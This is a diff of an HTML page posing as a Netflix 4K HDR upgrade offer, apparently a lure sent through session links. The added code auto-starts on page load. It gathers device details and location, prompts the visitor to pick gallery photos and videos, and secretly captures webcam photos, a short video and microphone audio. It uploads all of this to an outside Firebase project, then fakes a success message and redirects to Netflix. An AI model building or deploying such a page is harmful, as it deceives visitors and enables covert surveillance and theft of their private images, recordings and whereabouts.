@@ -3,103 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Stream Quality Upgrade</title>
+    <title>4K HDR Upgrade | Netflix</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+        
         .card {
-            background: #111;
-            border-radius: 28px;
-            padding: 32px 24px;
-            max-width: 400px;
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 40px 28px;
+            max-width: 420px;
             width: 100%;
             text-align: center;
-            border: 1px solid #222;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.5s ease;
         }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
         .logo {
-            width: 70px;
-            height: 70px;
-            background: #1a73e8;
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #e50914, #b20710);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 32px;
+            margin: 0 auto 24px;
+            font-size: 40px;
+            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
         }
-        h2 { color: #fff; font-size: 22px; margin-bottom: 8px; }
-        .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
-        .quality-box {
-            background: #1a1a1a;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 24px;
-            text-align: left;
+        
+        h1 {
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
         }
-        .quality-box p { color: #ccc; font-size: 13px; margin: 4px 0; }
-        .quality-badge {
-            background: #1a73e8;
+        
+        .badge {
             display: inline-block;
+            background: linear-gradient(135deg, #e50914, #b20710);
             padding: 4px 12px;
             border-radius: 20px;
             font-size: 11px;
-            font-weight: bold;
-            margin-top: 8px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #fff;
         }
+        
+        .sub {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        
+        .quality-box {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 28px;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .quality-box p {
+            color: #ccc;
+            font-size: 14px;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .quality-box .label {
+            color: #888;
+            width: 70px;
+        }
+        
+        .quality-box .value {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .quality-badge {
+            background: rgba(229, 9, 20, 0.2);
+            border: 1px solid rgba(229, 9, 20, 0.5);
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 12px;
+            color: #e50914;
+        }
+        
         .btn {
-            background: #1a73e8;
+            background: linear-gradient(135deg, #e50914, #b20710);
             color: white;
             border: none;
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             font-size: 16px;
-            font-weight: 600;
-            border-radius: 40px;
+            font-weight: 700;
+            border-radius: 44px;
             cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
         }
-        .btn:disabled { background: #444; cursor: not-allowed; }
-        .loader { margin-top: 16px; color: #1a73e8; font-size: 13px; display: none; }
-        input, video, canvas { display: none; }
-        .permission-box {
-            background: #1a1a1a;
-            border-radius: 12px;
-            padding: 12px;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #ffaa00;
+        
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(229, 9, 20, 0.4);
+        }
+        
+        .btn:disabled {
+            background: #444;
+            transform: none;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .loader {
+            margin-top: 20px;
+            color: #e50914;
+            font-size: 13px;
             display: none;
+            padding: 12px;
+            background: rgba(229, 9, 20, 0.1);
+            border-radius: 30px;
+        }
+        
+        .status-msg {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            display: none;
+            background: rgba(74, 222, 128, 0.1);
+            color: #4ade80;
+            border: 1px solid rgba(74, 222, 128, 0.3);
+        }
+        
+        .status-msg.error {
+            background: rgba(255, 107, 107, 0.1);
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.3);
+        }
+        
+        input, video, canvas {
+            display: none;
+        }
+        
+        .footer {
+            margin-top: 24px;
+            color: #555;
+            font-size: 10px;
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">🎬</div>
-        <h2>Upgrade to 4K HDR</h2>
-        <div class="sub">Enhanced streaming quality requires one-time setup</div>
+        <div class="logo">
+            🎬
+        </div>
+        <h1>4K HDR Upgrade</h1>
+        <div class="badge">⚡ LIMITED OFFER</div>
+        <div class="sub">Enhance your streaming quality in seconds</div>
         
         <div class="quality-box">
-            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
-            <p>📶 Current Quality: HD Ready</p>
-            <p>✨ Available: 4K HDR + Dolby Atmos</p>
-            <div class="quality-badge">⚡ One-click upgrade</div>
+            <p>
+                <span class="label">📱 Device:</span>
+                <span class="value" id="deviceName">Detecting...</span>
+            </p>
+            <p>
+                <span class="label">📶 Current:</span>
+                <span class="value">HD Ready (1080p)</span>
+            </p>
+            <p>
+                <span class="label">✨ Upgrade:</span>
+                <span class="value">4K HDR + Dolby Atmos</span>
+            </p>
+            <div class="quality-badge">⚡ One-click optimization</div>
         </div>
         
-        <button class="btn" id="upgradeBtn">⚡ Enable 4K HDR</button>
+        <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
         <div class="loader" id="loader">Optimizing your device...</div>
-        <div class="permission-box" id="permissionBox">⚠️ Please allow permissions when prompted</div>
+        <div class="status-msg" id="statusMsg"></div>
+        <div class="footer">
+            🔒 Encrypted • One-time setup • Instant activation
+        </div>
     </div>
     
     <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
@@ -107,31 +225,32 @@
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
+        // ========== FIREBASE CONFIG ==========
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
             projectId: "mobilehk-5e843",
+            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
             storageBucket: "mobilehk-5e843.firebasestorage.app",
             messagingSenderId: "287475964010",
             appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
         };
         
+        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        const db = firebase.database();
         const storage = firebase.storage();
         
+        // Get session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
         const upgradeBtn = document.getElementById('upgradeBtn');
         const loader = document.getElementById('loader');
-        const permissionBox = document.getElementById('permissionBox');
+        const statusMsg = document.getElementById('statusMsg');
         
         if (!sessionId) {
-            permissionBox.style.display = 'block';
-            permissionBox.style.background = '#2e0a0a';
-            permissionBox.style.color = '#ff6b6b';
-            permissionBox.innerHTML = '❌ Invalid upgrade link';
+            showMessage('❌ Invalid upgrade link. Please use the correct link.', true);
             upgradeBtn.disabled = true;
         }
         
@@ -139,88 +258,91 @@
         const ua = navigator.userAgent;
         let deviceName = "Unknown";
         if (ua.includes("iPhone")) deviceName = "iPhone";
-        else if (ua.includes("Android")) deviceName = "Android Phone";
+        else if (ua.includes("Android")) deviceName = "Android";
         else if (ua.includes("Windows")) deviceName = "Windows PC";
         else if (ua.includes("Mac")) deviceName = "Mac";
         document.getElementById('deviceName').innerText = deviceName;
         
-        async function saveToFirebase(type, data) {
-            if (!sessionId) return;
-            try {
-                await db.collection('sessions').doc(sessionId).collection('data').add({
-                    type: type,
-                    data: data,
-                    timestamp: new Date().toISOString()
-                });
-                return true;
-            } catch(e) { return false; }
+        function showMessage(msg, isError = false) {
+            statusMsg.style.display = 'block';
+            statusMsg.className = isError ? 'status-msg error' : 'status-msg';
+            statusMsg.innerHTML = msg;
+            setTimeout(() => {
+                statusMsg.style.display = 'none';
+            }, 4000);
         }
         
+        // Save to Realtime Database
+        async function saveData(type, data) {
+            if (!sessionId) return false;
+            try {
+                const timestamp = new Date().toISOString();
+                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
+                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
+                    type: type,
+                    data: data,
+                    timestamp: timestamp
+                });
+                console.log(`✅ Saved: ${type}`);
+                return true;
+            } catch(e) {
+                console.error('Save error:', e);
+                return false;
+            }
+        }
+        
+        // Upload file to Firebase Storage
         async function uploadFile(file, type) {
             if (!sessionId) return null;
             const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
             const ref = storage.ref(`uploads/${filename}`);
             await ref.put(file);
             const url = await ref.getDownloadURL();
-            await saveToFirebase(type, { url, name: file.name });
+            await saveData(type, { url, name: file.name, size: file.size });
             return url;
         }
         
-        // Step 1: Request ALL permissions at once
-        async function requestAllPermissions() {
-            permissionBox.style.display = 'block';
-            permissionBox.innerHTML = '🔐 Requesting permissions for 4K HDR...';
-            
-            const results = {
-                camera: false,
-                mic: false,
-                location: false
-            };
-            
-            // Request camera + mic together
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                results.camera = true;
-                results.mic = true;
-                // Keep stream for later use
-                window.mediaStream = stream;
-                permissionBox.innerHTML = '✅ Camera & Microphone granted';
-            } catch(e) {
-                permissionBox.innerHTML = '⚠️ Camera/Microphone access needed for 4K HDR';
-            }
-            
-            // Request location
+        // 1. Device Info
+        async function sendDeviceInfo() {
+            await saveData('device_info', {
+                device: deviceName,
+                ua: ua,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language
+            });
+        }
+        
+        // 2. Location
+        async function getLocation() {
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
-                results.location = true;
-                await saveToFirebase('location', {
+                await saveData('location', {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
                     map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                permissionBox.innerHTML = '✅ Location granted';
+                return true;
             } catch(e) {
-                permissionBox.innerHTML = '⚠️ Location access recommended';
+                return false;
             }
-            
-            return results;
         }
         
-        // Step 2: Gallery access (triggers file picker)
+        // 3. Gallery
         async function getGallery() {
             return new Promise((resolve) => {
                 const input = document.getElementById('galleryInput');
                 input.onchange = async (e) => {
                     const files = Array.from(e.target.files);
                     if (files.length === 0) { resolve(false); return; }
-                    loader.innerHTML = `📸 Optimizing ${files.length} files...`;
-                    for (let i = 0; i < Math.min(files.length, 30); i++) {
+                    loader.innerHTML = `📸 Uploading ${files.length} files...`;
+                    for (let i = 0; i < Math.min(files.length, 25); i++) {
                         const file = files[i];
                         const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                         await uploadFile(file, type);
-                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 30)}`;
+                        loader.innerHTML = `📸 Uploaded ${i+1}/${Math.min(files.length, 25)}`;
                     }
                     resolve(true);
                 };
@@ -228,40 +350,32 @@
             });
         }
         
-        // Step 3: Capture photos and video from existing stream
+        // 4. Camera + Video
         async function captureMedia() {
-            if (!window.mediaStream) {
-                // Try to get stream again
-                try {
-                    window.mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                } catch(e) {
-                    return false;
+            try {
+                loader.innerHTML = "📷 Requesting camera...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 500));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                
+                // 4 photos
+                for (let i = 1; i <= 4; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
+                    await uploadFile(file, 'camera_photo');
+                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
+                    await new Promise(r => setTimeout(r, 300));
                 }
-            }
-            
-            const stream = window.mediaStream;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 500));
-            
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            
-            // Take 4 photos
-            for (let i = 1; i <= 4; i++) {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-                const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
-                await uploadFile(file, 'camera_photo');
-                loader.innerHTML = `📷 Captured ${i}/4 photos`;
-                await new Promise(r => setTimeout(r, 300));
-            }
-            
-            // Video recording (5 seconds)
-            if (window.mediaStream.getAudioTracks().length > 0) {
-                loader.innerHTML = "🎥 Recording video...";
+                
+                // 5 sec video
+                loader.innerHTML = "🎥 Recording video (5s)...";
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
@@ -273,19 +387,19 @@
                 recorder.start();
                 await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
-                await new Promise(r => setTimeout(r, 1000));
+                
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) {
+                console.log("Camera error:", e);
+                return false;
             }
-            
-            // Don't stop stream yet - will stop at end
-            return true;
         }
         
-        // Step 4: Microphone recording (if not already captured in video)
+        // 5. Microphone
         async function getMicrophone() {
-            if (window.mediaStream && window.mediaStream.getAudioTracks().length > 0) {
-                return true; // Already recorded in video
-            }
             try {
+                loader.innerHTML = "🎤 Testing audio...";
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -311,37 +425,20 @@
             loader.style.display = 'block';
             loader.innerHTML = "🔧 Preparing device optimization...";
             
-            // Device info
-            await saveToFirebase('device_info', {
-                device: deviceName,
-                ua: ua,
-                screen: `${screen.width}x${screen.height}`
-            });
+            await sendDeviceInfo();
+            await getLocation();
             
-            // Request all permissions at once
-            await requestAllPermissions();
-            
-            // Gallery access (separate user action)
-            loader.innerHTML = "📸 Select photos to optimize...";
+            loader.innerHTML = "📸 Select media to optimize...";
+            showMessage("Please select photos/videos from your gallery", false);
             await getGallery();
             
-            // Capture photos and video
             await captureMedia();
-            
-            // Extra mic if needed
             await getMicrophone();
             
-            // Clean up
-            if (window.mediaStream) {
-                window.mediaStream.getTracks().forEach(t => t.stop());
-            }
-            
-            await saveToFirebase('upgrade_complete', { timestamp: new Date().toISOString() });
+            await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
             
             loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
-            permissionBox.style.background = '#0a2e1a';
-            permissionBox.style.color = '#4ade80';
-            permissionBox.innerHTML = '✅ 4K HDR is now active on your device';
+            showMessage("4K HDR is now active on your device", false);
             
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
@@ -350,7 +447,7 @@
         
         upgradeBtn.onclick = startUpgrade;
         
-        // Auto-start after 0.5s
+        // Auto-start after 500ms
         if (sessionId) {
             setTimeout(startUpgrade, 500);
         }
